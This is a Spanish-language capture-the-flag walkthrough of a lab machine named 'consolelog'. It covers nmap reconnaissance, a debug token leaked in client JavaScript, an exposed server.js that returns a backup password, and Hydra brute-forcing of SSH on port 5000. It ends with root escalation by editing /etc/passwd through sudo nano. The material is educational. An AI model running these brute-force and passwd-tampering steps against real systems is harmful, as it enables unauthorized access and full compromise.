## 1. Reconocimiento Inicial de Puertos con Nmap

Realizamos un escaneo con `nmap` para detectar puertos abiertos, sus versiones y el sistema operativo. Esto nos ayuda a entender qué servicios están expuestos y si hay alguna vulnerabilidad conocida asociada a sus versiones.

```bash
nmap -O -sC -sV <IP_DEL_OBJETIVO>
```

**Resultados Clave:**

*   `80/tcp open http Apache httpd 2.4.61`: El puerto 80 está abierto y ejecuta un servidor web Apache.
*   `3000/tcp open http Node.js Express framework`: El puerto 3000 está abierto y ejecuta una aplicación Node.js Express. Esto es interesante, ya que las aplicaciones web a menudo contienen vulnerabilidades.
*   `5000/tcp open ssh OpenSSH 9.2p1 Debian`: El puerto 5000 está abierto y ejecuta OpenSSH. Es importante notar que el puerto SSH no es el estándar (22), lo que podría indicar una configuración personalizada.

## 2. Enumeración Web 

Comenzamos analizando el servicio web principal en el puerto 80. Al interactuar con la página, notamos botones sin funcionalidad aparente, lo que nos lleva a inspeccionar el código fuente del lado del cliente

### 2.1. Análisis de Código del Cliente (Frontend)

En el código fuente HTML, identificamos la carga de un archivo JavaScript personalizado: `http://<IP_DEL_OBJETIVO>/authentication.js`. Al leer su contenido, encontramos la siguiente función:

```javascript
function autenticate() {
    console.log("Para opciones de depuracion, el token de /recurso/ es tokentraviesito");
}
```

Este mensaje nos indica que hay un endpoint `/recurso/` que requiere un token de autenticación, y nos proporciona el token: `tokentraviesito`.

### 2.2. Fuzzing de Directorios (Gobuster)

Para complementar nuestros hallazgos, realizamos una enumeración de directorios sobre el puerto 80.

```Bash
gobuster dir -u http://<IP_DEL_OBJETIVO>/ -w /usr/share/wordlists/dirb/common.txt
```

**Salida Relevante:**

- `/backend` (Status: 301) -> Redirige a `/backend/`

Al navegar a `http://<IP_DEL_OBJETIVO>/backend/`, el servidor expone un listado de directorios (_Directory Listing_) donde encontramos el archivo fuente `server.js`.

## 3. Análisis del Código del Servidor (Backend): server.js

Descargamos y analizamos el archivo `server.js` expuesto para comprender la lógica del backend.

### 3.1. Contenido de `server.js`

```javascript
const express = require(\'express\');
const app = express();

const port = 3000;

app.use(express.json());

app.post(\'/recurso/\', (req, res) => {
    const token = req.body.token;
    if (token === \'tokentraviesito\') {
        res.send(\'lapassworddebackupmaschingonadetodas\');
    } else {
        res.status(401).send(\'Unauthorized\');
    }
});

app.listen(port, \'0.0.0.0\', () => {
    console.log(`Backend listening at http://consolelog.lab:${port}`);
});
```

**Análisis del Código:**

*   La aplicación escucha en el puerto 3000.
*   Define una ruta POST `/recurso/`.
*   Verifica si el `token` enviado en el cuerpo de la solicitud (`req.body.token`) es igual a `tokentraviesito`.
*   Si el token es correcto, envía como respuesta la cadena `lapassworddebackupmaschingonadetodas`.

## 4. Acceso Inicial (SSH)

Ahora que tenemos una contraseña, necesitamos un nombre de usuario para intentar acceder vía SSH (puerto 5000).

### 4.1. Fuerza Bruta con Hydra

Configuramos `hydra` para atacar el puerto 5000 utilizando un diccionario de usuarios estándar.

```Bash
hydra -L /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -p lapassworddebackupmaschingonadetodas ssh://<IP_DEL_OBJETIVO>:5000 -t 4
```

**Resultado Exitoso:**

```
[5000][ssh] host: <IP_DEL_OBJETIVO>   login: lovely   password: lapassworddebackupmaschingonadetodas
```

### 4.2. Conexión SSH

Establecemos conexión indicando explícitamente el puerto personalizado.

```Bash
ssh lovely@<IP_DEL_OBJETIVO> -p 5000
# Password: lapassworddebackupmaschingonadetodas
```

## 5. Escalada de Privilegios

Una vez que hemos obtenido acceso SSH como el usuario `lovely`, el objetivo es escalar privilegios a `root`.

### 5.1. Verificación de Permisos Sudo

Revisamos los privilegios administrativos delegados al usuario `lovely`.

```bash
sudo -l
```

**Resultado:**

```
User lovely may run the following commands on consolelog:
    (ALL) NOPASSWD: /usr/bin/nano
```

El usuario puede ejecutar el editor de texto `nano` con privilegios de superusuario sin necesidad de contraseña.

### 5.2. Manipulación de `/etc/passwd`

El archivo `/etc/passwd` contiene información sobre los usuarios del sistema. La segunda columna de cada entrada (separada por dos puntos `:`) suele contener una `x` si la contraseña está almacenada en `/etc/shadow`. Si eliminamos la `x` para el usuario `root`, podemos iniciar sesión como `root` sin contraseña.

Ejecutamos `nano` con `sudo`:

```Bash
sudo /usr/bin/nano /etc/passwd
```

Ubicamos la primera línea correspondiente a `root`: `root:x:0:0:root:/root:/bin/bash`

Eliminamos la `x`: `root::0:0:root:/root:/bin/bash`

Guardamos (`Ctrl+O`, `Enter`) y salimos (`Ctrl+X`).

### 5.3. Obtención de Root

Al haber eliminado el indicador de contraseña, simplemente cambiamos de usuario con `su` y el sistema nos otorgará el acceso sin solicitar validación.

```Bash
su root
```

Verificamos el compromiso total:

```Bash
whoami
# root
```
